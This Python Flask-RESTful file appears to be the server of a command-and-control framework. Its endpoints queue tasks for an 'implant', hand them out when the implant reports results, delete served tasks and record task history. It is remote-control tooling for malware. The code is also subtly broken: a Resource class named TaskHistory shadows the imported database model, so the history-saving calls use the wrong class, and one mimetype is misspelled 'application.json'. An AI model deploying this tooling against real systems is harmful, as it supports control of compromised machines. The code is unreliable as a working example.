import uuid
import json

from flask import request, Response
from flask_restful import Resource
from database.db import initialize_db
from database.models import Task, Result, TaskHistory


class Tasks(Resource):
    # ListTasks
    def get(self):
        # Get all the task objects and return them to the user
        tasks = Task.objects().to_json()
        return Response(tasks, mimetype="application/json", status=200)

    # AddTasks
    def post(self):
        # Parse out the JSON body we want to add to the database
        body = request.get_json()
        json_obj = json.loads(json.dumps(body))
        # Get the number of Task objects in the request
        obj_num = len(body)
        # For each Task object, add it to the database
        for i in range(len(body)):
            # Add a task UUID to each task object for tracking
            json_obj[i]['task_id'] = str(uuid.uuid4())
            # Save Task object to database
            Task(**json_obj[i]).save()
            # Load the options provided for the task into an array for tracking in history
            task_options = []
            for key in json_obj[i].keys():
                # Anything that comes after task_type and task_id is treated as an option
                if (key != "task_type" and key != "task_id"):
                    task_options.append(key + ": " + json_obj[i][key])

            # Add to task history
            TaskHistory(
                task_id=json_obj[i]['task_id'],
                task_type=json_obj[i]['task_type'],
                task_object=json.dumps(json_obj),
                task_options=task_options,
                task_results=""
            ).save()
        # Return the last Task objects that were added
        return Response(Task.objects.skip(Task.objects.count() - obj_num).to_json(),
                        mimetype="application/json",
                        status=200)

class Results(Resource):
    # ListResults
    def get(self):
        # Get all the result objects and return them to the user
        results = Result.objects().to_json()
        return Response(results, mimetype="application.json", status=200)

    # AddResults
    def post(self):
        # Check if results from the implant are populated
        body = request.get_json()
        if not body:
            # If the body is empty or None, just serve new tasks
            tasks = Task.objects().to_json()
            Task.objects().delete()
            return Response(tasks, mimetype="application/json", status=200)

        print("Received implant response: {}".format(body))

        # The body is a list of result objects, so we loop through it
        for result_item in body:
            # Each item is a dict like {'task_id': {'contents': '...', 'success': '...'}}
            # We get the first (and only) key-value pair
            task_id, result_data = next(iter(result_item.items()))

            # Create a new, clean dictionary for the database model
            # It combines the task_id with the contents from the nested dict
            # The **result_data unpacks the {'contents': '...', 'success': '...'} dict
            parsed_result = {
                'task_id': task_id,
                **result_data
            }

            # Add a result UUID for tracking this specific result entry
            parsed_result['result_id'] = str(uuid.uuid4())

            # Save the properly formatted result to the database
            Result(**parsed_result).save()

        # After saving all results, serve the latest tasks to the implant
        tasks = Task.objects().to_json()
        # Clear tasks so they don't execute twice
        Task.objects().delete()
        return Response(tasks, mimetype="application/json", status=200)
    

class TaskHistory(Resource):
    # ListTaskHistory
    def get(self):
        # Get all the task history objects and return them to the user
        history = TaskHistory.objects().to_json()
        results = Result.objects().to_json()
        json_obj = json.loads(results)
        return Response(history, mimetype="application/json", status=200)

    # AddTaskHistory
    def post(self):
        # Parse out the JSON body we want to add to the database
        body = request.get_json()
        json_obj = json.loads(json.dumps(body))
        # Save TaskHistory object to database
        TaskHistory(**json_obj).save()
        return Response(json.dumps({"message": "Task history saved successfully"}), mimetype="application/json", status=201)